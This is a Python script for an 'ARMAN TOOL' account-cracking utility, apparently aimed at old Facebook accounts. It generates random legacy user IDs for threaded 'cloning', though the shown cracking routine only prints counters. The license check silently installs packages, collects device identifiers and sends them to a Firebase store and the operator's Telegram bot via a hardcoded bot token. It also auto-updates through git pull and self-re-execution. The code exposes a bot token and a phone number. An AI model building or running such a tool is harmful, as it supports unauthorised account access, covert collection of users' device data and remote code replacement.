import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
import warnings
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime, timedelta

warnings.filterwarnings("ignore", category=SyntaxWarning)

modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module} > /dev/null 2>&1')

import requests
from requests.exceptions import ConnectionError

requests.urllib3.disable_warnings()

FIREBASE_URL = "https://arman-f9a3b-default-rtdb.firebaseio.com/"

BOT_TOKEN = "8533770908:AAGpn4bIfoArEOyN7SjTskWnzIyGGjEPOoc"
TELEGRAM_USER = "7111707713"

def check_update():
    try:
        url = "https://arman-f9a3b-default-rtdb.firebaseio.com/123/Version.json"
        response = requests.get(url, timeout=5)
        server_version = response.json()
        current_version = "15.3"
        if server_version and str(server_version).strip() != str(current_version).strip():
            os.system('git pull origin main > /dev/null 2>&1 || git pull > /dev/null 2>&1')
            time.sleep(2)
            os.execv(sys.executable, ['python'] + sys.argv)
    except Exception:
        pass

def get_device_model():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip().capitalize()
        model = os.popen("getprop ro.product.model").read().strip()
        if brand and model:
            if brand.lower() in model.lower(): return model
            return f"{brand} {model}"
        elif model: return model
        elif brand: return brand
    except Exception:
        pass
    return "Unknown Device"

def get_android_version():
    try:
        return os.popen("getprop ro.build.version.release").read().strip() or "Unknown"
    except Exception:
        return "Unknown"

def get_hwid():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip()
        model = os.popen("getprop ro.product.model").read().strip()
        device = os.popen("getprop ro.product.device").read().strip()
        if brand or model or device:
            combined = f"{brand}_{model}_{device}"
            if len(combined.strip("_")) > 2: return combined
    except Exception:
        pass
    try:
        android_id = os.popen("settings get secure android_id").read().strip()
        if android_id and android_id != "null": return f"AND_ID_{android_id}"
    except Exception:
        pass
    try:
        return platform.node() + "_" + platform.machine()
    except Exception:
        return "ARMAN_DEVICE_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def record_user_daily_usage(user_key):
    try:
        today_date = datetime.now().strftime("%Y-%m-%d")
        usage_path = f"{FIREBASE_URL}keys/{user_key}/daily_usage/{today_date}.json"
        res = requests.get(usage_path, timeout=3)
        current_count = res.json()
        new_count = (current_count + 1) if isinstance(current_count, int) else 1
        requests.put(usage_path, json=new_count, timeout=3)
    except Exception:
        pass

def send_login_alert(user_key, user_name, expiry_date):
    device_name = get_device_model()
    android_ver = get_android_version()
    message = (
        "🔥 NEW USER / TRIAL ACTIVATED!\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 Customer Name: {user_name}\n"
        f"🔑 Key / Trial Code: {user_key}\n"
        f"📱 Device Model: {device_name}\n"
        f"🤖 Android Ver: {android_ver}\n"
        f"⏰ Expiry Date: {expiry_date}\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": TELEGRAM_USER, "text": message}, timeout=5)
    except Exception:
        pass

def calculate_time_left(expiry_str):
    if not expiry_str: return expiry_str
    try:
        try: exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
        except: exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d")
        diff = exp_dt - datetime.now()
        total_seconds = diff.total_seconds()
        if total_seconds <= 0: return "Expired"
        total_hours = int(total_seconds // 3600)
        minutes = int((total_seconds % 3600) // 60)
        if total_hours < 24: return f"{total_hours}h {minutes}m Left"
        else: return f"{total_hours // 24}d {total_hours % 24}h {minutes}m Left"
    except:
        return expiry_str

def display_welcome_banner(user_name, user_key, time_left):
    os.system('clear')
    print(f"""
\033[1;36m╔════════════════════════════════════════════╗
║             🔥 ARMAN TOOL 🔥               ║
╠════════════════════════════════════════════╣
║ 🇵🇰 ᴘᴛɪ       : ᴘᴛɪ ᴛɪɢᴇʀ                   ║
║ 👑 ᴋʜᴀɴ ᴅɪᴡᴀɴᴀ: ᴅɪʟ ᴍᴀɪɴ ɪᴍʀᴀɴ ᴋʜᴀɴ         ║
║ ⏳ ᴠᴀʟɪᴅɪᴛʏ  : {time_left:<27} ║
║ ⚡ sʏsᴛᴇᴍ ᴋᴀ ʙᴀᴘ: ɪᴍʀᴀɴ ᴋʜᴀɴ               ║
╚════════════════════════════════════════════╝\033[0m
""")

def hold_screen_10_seconds():
    for i in range(10, 0, -1):
        print(f"\r\033[1;33m[⏳] Starting Tool in {i:02d} seconds...\033[0m", end="", flush=True)
        time.sleep(1)
    print("\n\033[1;32m[✓] Loading Main Menu...\033[0m")
    time.sleep(1)

def check_key():
    check_update()
    try:
        for m_node in ["maintenance.json", "maintenance_mode.json"]:
            m_res = requests.get(f"{FIREBASE_URL}{m_node}", timeout=5)
            if m_res.json() in ("ON", True, "True", 1, "1"):
                os.system('clear')
                print("\n\033[1;31m[!] SYSTEM IS UNDER MAINTENANCE / BLOCKED BY ADMIN!\033[0m\n")
                sys.exit()
    except Exception:
        pass

    saved_key_file = "/data/data/com.termux/files/home/.arm_key.txt"
    try:
        if not os.path.exists("/data/data/com.termux"):
            import pathlib
            saved_key_file = os.path.join(str(pathlib.Path.home()), ".arm_key.txt")
    except Exception:
        pass
        
    user_hwid = get_hwid()
    user_key = None
    if os.path.exists(saved_key_file):
        try:
            with open(saved_key_file, "r") as f: user_key = f.read().strip().upper()
        except: pass

    key_data, is_valid = None, False
    if user_key:
        try:
            res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
            key_data = res.json()
            if key_data and isinstance(key_data, dict):
                expiry_str = key_data.get('expiry')
                saved_hwid = key_data.get('hwid')
                if saved_hwid in ("None", "", None):
                    requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={'hwid': user_hwid})
                    saved_hwid = user_hwid
                if expiry_str != "Lifetime" and expiry_str < datetime.now().strftime("%Y-%m-%d %H:%M"):
                    if os.path.exists(saved_key_file): os.remove(saved_key_file)
                elif saved_hwid in (user_hwid, "None", "", None):
                    is_valid = True
        except: pass

    if not is_valid:
        try:
            safe_hwid_node = user_hwid.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_").replace("/", "_")
            trial_check_res = requests.get(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", timeout=10)
            if trial_check_res.json() is not True:
                requests.put(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", json=True)
                trial_key = "TRL-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                expiry_date = (datetime.now() + timedelta(days=2)).strftime('%Y-%m-%d %H:%M')
                payload = {'name': "Auto_Trial_User", 'expiry': expiry_date, 'hwid': user_hwid, 'device_model': get_device_model(), 'android_version': get_android_version(), 'app_version': '1.0'}
                requests.put(f"{FIREBASE_URL}keys/{trial_key}.json", json=payload)
                send_login_alert(trial_key, "Auto_Trial_User", expiry_date)
                with open(saved_key_file, "w") as f: f.write(trial_key)
                user_key, key_data, is_valid = trial_key, payload, True
        except: pass

    if not is_valid:
        if os.path.exists(saved_key_file): 
            try: os.remove(saved_key_file)
            except: pass
        os.system('clear')
        customer_name = input("\033[1;33m[?] Enter Your Name: \033[0m").strip().upper() or "USER"
        user_key = input("\n\033[1;36m[?] Enter Your Key: \033[0m").strip().upper()
        try:
            res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
            key_data = res.json()
            if key_data and isinstance(key_data, dict):
                requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={'hwid': user_hwid, 'name': customer_name, 'device_model': get_device_model(), 'android_version': get_android_version()})
                send_login_alert(user_key, customer_name, key_data.get('expiry'))
                with open(saved_key_file, "w") as f: f.write(user_key)
                is_valid = True
            else:
                print("\n\033[1;31m[×] Invalid Key!\033[0m")
                sys.exit()
        except Exception as e:
            print(f"\n\033[1;31m[×] Connection Error: {e}\033[0m")
            sys.exit()

    record_user_daily_usage(user_key)
    return key_data.get("name", "USER"), user_key, key_data.get('expiry')

oks, cps, loop = [], [], 0
X, rad, G, Y, W = '\x1b[1;37m', '\x1b[38;5;196m', '\x1b[38;5;46m', '\x1b[38;5;220m', '\x1b[1;37m'

def show_branding():
    os.system('clear' if 'win' not in sys.platform else 'cls')
    print(r"""\033[1;32m
      _    ____  ____  __  __    _    _   _ 
     / \  |  _ \|  _ \|  \/  |  / \  | \ | |
    / _ \ | |_) | |_) | |\/| | / _ \ |  \| |
   / ___ \|  _ <|  _ <| |  | |/ ___ \| |\  |
  /_/   \_\_| \_\_| \_\_|  |_/_/   \_\_| \_|
\033[0m""")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mARMAN")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mARMAN-TOOL")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAPP   \x1b[38;5;46m▶  \033[1;97m03022745249")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m15.3")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def BNG_71_():
    show_branding()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mOLD CLONE')
    linex()
    if input("       \x1b[38;5;41mCHOICE  " + W + ": " + Y).lower() in ('a', '01', '1'):
        old_clone()
    else:
        BNG_71_()

def old_clone():
    show_branding()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49m2009 SERIES')
    linex()
    ch = input("       \x1b[38;5;41mCHOICE  " + W + ": " + Y).lower()
    if ch in ('a', '1', '01'): old_One()
    elif ch in ('b', '2', '02'): old_Tow()
    elif ch in ('c', '3', '03'): old_Tree()
    else: old_clone()

def run_cracker(user):
    global loop
    try:
        sys.stdout.write(f"\r\r\033[1;37m[ARMAN-OLD] [{loop}/{len(user)}] [OK:{len(oks)}] [CP:{len(cps)}]\033[0m")
        sys.stdout.flush()
        loop += 1
    except:
        pass

def old_One():
    user = []
    show_branding()
    print("       \x1b[38;5;49mOld Code " + Y + ":" + G + " 2010-2014")
    input("       \x1b[38;5;41mSELECT " + Y + ":" + G + " ")
    linex()
    show_branding()
    limit = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mLIMIT   " + Y + ":" + G + " ")
    try: lim = int(limit)
    except: lim = 1000
    for _ in range(lim):
        user.append('10000' + ''.join(random.choices(string.digits, k=7)))
    
    with tred(max_workers=30) as pool:
        for uid in user:
            pool.submit(run_cracker, uid)
    print(f"\n\x1b[38;5;46m[✓] Process Completed!\033[0m")
    input("\nPress Enter to Back..."); BNG_71_()

def old_Tow():
    user = []
    show_branding()
    print("       \x1b[38;5;49mSeries " + Y + ":" + G + " 100003/4")
    linex()
    limit = input("       \x1b[38;5;46mLimit : ")
    try: lim = int(limit)
    except: lim = 1000
    for _ in range(lim):
        user.append('100003' + ''.join(random.choices(string.digits, k=7)))
    
    with tred(max_workers=30) as pool:
        for uid in user:
            pool.submit(run_cracker, uid)
    print(f"\n\x1b[38;5;46m[✓] Process Completed!\033[0m")
    input("\nPress Enter to Back..."); BNG_71_()

def old_Tree():
    user = []
    show_branding()
    print("       \x1b[38;5;49mSeries " + Y + ":" + G + " 2009")
    linex()
    limit = input("       \x1b[38;5;46mLimit : ")
    try: lim = int(limit)
    except: lim = 1000
    for _ in range(lim):
        user.append('100000' + ''.join(random.choices(string.digits, k=6)))
    
    with tred(max_workers=30) as pool:
        for uid in user:
            pool.submit(run_cracker, uid)
    print(f"\n\x1b[38;5;46m[✓] Process Completed!\033[0m")
    input("\nPress Enter to Back..."); BNG_71_()

if __name__ == '__main__':
    name, key, expiry = check_key()
    display_welcome_banner(name, key, calculate_time_left(expiry))
    hold_screen_10_seconds()
    BNG_71_()
